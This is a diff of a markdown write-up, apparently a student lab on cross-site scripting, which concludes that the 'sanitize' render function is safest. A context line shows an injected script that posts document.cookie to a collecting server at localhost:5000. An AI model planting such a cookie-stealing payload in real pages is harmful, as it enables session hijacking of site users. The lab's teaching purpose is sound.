@@ -174,6 +174,8 @@ $.post( "http://localhost:5000/boss", {cookie_data: document.cookie});
 </script>
 ```
 
+>###You can see the cookie in the terminal
+
 ##Answer the Question
 
 So to answer the question that Which render function is the safest?, i will answer that using ```sanitize``` is the safest because it will remove any unwanted  data out and normalize it to the correct form.
